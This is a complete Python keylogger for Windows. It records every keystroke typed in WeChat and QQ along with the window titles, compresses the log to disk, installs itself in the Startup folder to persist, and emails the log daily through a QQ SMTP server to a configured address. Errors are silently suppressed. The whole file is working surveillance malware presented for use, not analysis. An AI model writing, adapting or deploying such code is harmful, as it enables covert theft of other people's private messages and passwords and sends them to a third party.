import os
import struct
import zlib
import time
from collections import defaultdict
import keyboard
import psutil
import win32gui
import win32process
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import threading
import queue
import atexit

# Configuration
TARGET_APPS = ["WeChat", "QQ"]  # Modify for easier testing, e.g., Notepad
from_addr = "your_email@example.com"
to_addr = "recipient_email@example.com"
password = "your_email_password_or_smtp_token"
compressed_file = "D:\\key_data.bin"
interval_time = 86400  # 24 hours in seconds

# Global variables
current_window_title = None
key_buffer = []
MERGE_INTERVAL = 10  # 10 seconds merge interval
is_target_app_active = False
current_app_name = "Unknown"
data_queue = queue.Queue()
save_queue = queue.Queue()
email_queue = queue.Queue()
window_check_interval = 0.1
process_update_interval = 0.5
app_pids = defaultdict(list)

# 自启动功能
def enable_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_name = os.path.basename(__file__)
    script_path = os.path.join(os.getcwd(), script_name)
    startup_path = os.path.join(startup_dir, script_name)
    
    if not os.path.exists(startup_path):
        with open(startup_path, 'w') as file:
            file.write(f'"{script_path}"')

# 发送邮件功能
def send_email(subject, attachment_path):
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject

    with open(attachment_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(attachment_path)}")
    msg.attach(part)

    try:
        server = smtplib.SMTP_SSL('smtp.qq.com', 465)
        server.login(from_addr, password)
        server.sendmail(from_addr, to_addr, msg.as_string())
        server.close()
    except Exception as e:
        pass

def email_thread():
    while True:
        try:
            subject, attachment_path = email_queue.get()
            send_email(subject, attachment_path)
            email_queue.task_done()
        except Exception as e:
            pass

# 检查并发送邮件
def check_and_send_email():
    if os.path.exists(compressed_file):
        last_mod_time = os.path.getmtime(compressed_file)
        current_time = time.time()
        if current_time - last_mod_time > interval_time:
            subject = f'{time.strftime("%Y/%m/%d的记录", time.localtime(last_mod_time))}'
            email_queue.put((subject, compressed_file))

def save_compressed_file(app_name, window_title, key_data):
    global compressed_file

    if not key_data:
        return

    existing_data = bytearray()
    if os.path.exists(compressed_file):
        with open(compressed_file, 'rb') as file:
            compressed_data = file.read()
            if compressed_data:
                try:
                    existing_data = bytearray(zlib.decompress(compressed_data))
                except zlib.error:
                    existing_data = bytearray()

    raw_data = existing_data

    # Remove .exe from app_name
    app_name = app_name.rsplit('.exe', 1)[0]

    full_title = f"{app_name}: {window_title}"
    for key_name, count, timestamp in key_data:
        raw_data.append(1)
        title_bytes = full_title.encode('utf-8')
        raw_data.extend(struct.pack('I', len(title_bytes)))
        raw_data.extend(title_bytes)
        key_bytes = key_name.encode('utf-8')
        raw_data.extend(struct.pack('I', len(key_bytes)))
        raw_data.extend(key_bytes)
        raw_data.extend(struct.pack('I', count))
        raw_data.extend(struct.pack('<d', timestamp))

    if raw_data:
        compressed_data = zlib.compress(bytes(raw_data))
        with open(compressed_file, 'wb') as file:
            file.write(compressed_data)

def on_key_event(e):
    global key_buffer, is_target_app_active, current_app_name, current_window_title
    if e.event_type == "down":
        key_name = e.name
        current_time = time.time()

        if is_target_app_active or not TARGET_APPS:
            if key_buffer and key_buffer[-1][0] == key_name and current_time - key_buffer[-1][2] <= MERGE_INTERVAL:
                # If the key is the same as the last one and within the merge interval, increment the count
                key_buffer[-1] = (key_name, key_buffer[-1][1] + 1, key_buffer[-1][2])
            else:
                # If it's a new key or outside the merge interval, add a new entry
                key_buffer.append((key_name, 1, current_time))

def get_process_pids(process_names):
    pids = defaultdict(list)
    for proc in psutil.process_iter(['pid', 'name']):
        for name in process_names:
            if name.lower() in proc.info['name'].lower():
                pids[name].append(proc.info['pid'])
    return pids

def get_foreground_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        title = win32gui.GetWindowText(hwnd)
        if pid <= 0:
            return None, title
        return pid, title
    except Exception as e:
        return None, "Unknown"

def normalize_title(title):
    return title.lstrip('*')

def is_app_active(current_app_pids):
    fg_window_info = get_foreground_window_info()
    if fg_window_info[0] is None:
        return False, fg_window_info[1], "Unknown"

    fg_window_pid, fg_window_title = fg_window_info
    for app_name, pids in current_app_pids.items():
        if fg_window_pid in pids:
            return True, normalize_title(fg_window_title), app_name
    
    try:
        process = psutil.Process(fg_window_pid)
        actual_app_name = process.name()
    except psutil.NoSuchProcess:
        actual_app_name = "Unknown"
    except Exception as e:
        actual_app_name = "Error"
    
    return False, normalize_title(fg_window_title), actual_app_name

def window_checker():
    global current_window_title, is_target_app_active, current_app_name, app_pids, key_buffer
    last_app_name = None
    last_window_title = None

    while True:
        try:
            is_active, window_title, app_name = is_app_active(app_pids)

            if is_active or not TARGET_APPS:
                if app_name != last_app_name or window_title != last_window_title:
                    if last_app_name:
                        save_queue.put(('save', last_app_name, last_window_title, key_buffer))
                        key_buffer = []

                    current_window_title = window_title
                    current_app_name = app_name
                    last_app_name = app_name
                    last_window_title = window_title
                    is_target_app_active = True

            elif last_app_name:
                save_queue.put(('save', last_app_name, last_window_title, key_buffer))
                key_buffer = []
                last_app_name = None
                last_window_title = None
                is_target_app_active = False

        except Exception as e:
            pass

        time.sleep(window_check_interval)

def save_thread():
    while True:
        try:
            action, app_name, window_title, data = save_queue.get()
            if action == 'save':
                save_compressed_file(app_name, window_title, data)
            save_queue.task_done()
        except Exception as e:
            pass

def process_updater():
    global app_pids
    while True:
        new_app_pids = get_process_pids(TARGET_APPS) if TARGET_APPS else {}
        if new_app_pids != app_pids:
            app_pids = new_app_pids
        time.sleep(process_update_interval)

def save_data_on_exit():
    save_queue.put(('save', current_app_name, current_window_title, key_buffer))
    save_queue.join()  # Wait for all saving tasks to complete

def main():
    enable_startup()
    check_and_send_email()

    keyboard.hook(on_key_event)

    # Register the exit handler
    atexit.register(save_data_on_exit)

    # Start the window checker thread
    window_checker_thread = threading.Thread(target=window_checker, daemon=True)
    window_checker_thread.start()

    # Start the save thread
    save_thread_instance = threading.Thread(target=save_thread, daemon=True)
    save_thread_instance.start()

    # Start the process updater thread
    process_updater_thread = threading.Thread(target=process_updater, daemon=True)
    process_updater_thread.start()

    # Start the email thread
    email_thread_instance = threading.Thread(target=email_thread, daemon=True)
    email_thread_instance.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        save_data_on_exit()

if __name__ == "__main__":
    main()